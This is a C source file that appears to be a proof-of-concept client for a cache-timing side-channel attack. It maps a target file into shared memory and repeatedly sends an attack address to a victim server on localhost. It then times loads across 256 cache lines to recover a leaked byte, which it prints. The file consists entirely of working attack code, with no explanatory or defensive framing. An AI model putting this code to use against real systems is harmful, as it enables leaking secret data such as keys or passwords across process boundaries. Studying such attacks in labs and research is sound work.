#include <stdio.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netdb.h>
#include "cache.h"
#include "utils.h"

static const char *argv0;
void usage() {
    const char *usage =
        "usage: %1$s addr port target offset\n";
    fprintf(stderr, usage, argv0);
    exit(1);
}

static void *map_file(const char *file, size_t offset) {
    int fd = trycall(open(file, O_RDONLY, 0666), "open file");
    char *mem = mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, fd, offset & ~0xfff);
    if (mem == MAP_FAILED) { perror("mmap"); exit(errno); }
    /* mlock(mem, 0x1000); */
    return mem + (offset & 0xfff);
}

int main(int argc, char *const argv[]) {
    argv0 = argv[0];
    if (argc != 5)
        usage();

    char *end;
    size_t attack_addr = strtoul(argv[2], &end, 0);
    if (*end != '\0')
        usage();
    const char *target = argv[3];
    size_t offset = strtoul(argv[4], &end, 0);
    if (*end != '\0')
        usage();
    char *mem = map_file(target, offset);

    int sock = socket(AF_INET, SOCK_STREAM, 0); check("socket");
    struct addrinfo hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM};
    struct addrinfo *addr;
    getaddrinfo("localhost", argv[1], &hints, &addr); check("getaddrinfo");
    connect(sock, addr->ai_addr, addr->ai_addrlen); check("connect");
    FILE *sockf = fdopen(sock, "r+");

    char hist[256] = {};
    int max = 0;
    unsigned char ch = 0;
    while (max < 5) {
        // send some things
        char buf[100];
        for (int i = 0; i < 10; i++) {
            fprintf(sockf, "%ld 0\n", attack_addr);
            fflush(sockf);
            fgets(buf, sizeof(buf), sockf);
        }
        // observe the results
        for (int j = 0; j < 256; j++) {
            int i = ((j * 167) + 13) & 0xff;
            char *ptr = &mem[i * 0x100];
            uint64_t clocks = time_load(ptr);
            flush(ptr);
            if (clocks < THRESHOLD) {
                hist[i]++;
                if (hist[i] > max) {
                    max = hist[i];
                    ch = i;
                }
            }
        }
    }
    printf("%c %d\n", ch, max);
}
